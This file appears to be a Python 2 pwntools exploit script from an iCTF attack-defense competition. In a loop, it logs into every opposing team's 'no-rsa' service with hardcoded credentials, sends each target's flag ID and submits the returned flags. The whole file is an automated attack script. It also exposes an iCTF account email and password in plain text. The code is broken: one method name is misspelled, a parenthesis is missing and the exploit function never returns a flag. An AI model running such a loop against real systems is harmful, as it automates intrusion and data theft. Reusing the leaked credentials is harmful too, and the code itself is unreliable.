from pwn import *
import time
from ictf import iCTF
i = iCTF()
context.log_level = 'DEBUG'

team = i.login('nmg355@nyu.edu', 'HZBrKynG4XAMvWPa')


def exploit(t):
    with remote(t['hostname'], t['port'], timeout=3) as r:
		r.recvuntil(">")
		r.sendline("login")
		r.recvuntil(":")
		r.sendline("e3pdT130W6vs")
		r.recvuntil(":")
		r.sendlinel("kSrgKwHPV")
		r.recvuntil("?")
		r.sendline(t['flag_id']
					

while True:
    time.sleep(team.get_tick_info()['approximate_seconds_left'] + 30)
    flags = []
    for t in team.get_targets(service='no-rsa')['targets']:
        try:
            f = exploit(t)
        except:
            continue
        if f.startswith('FLG'):
            flags.append(f)

    print team.submit_flag(flags)
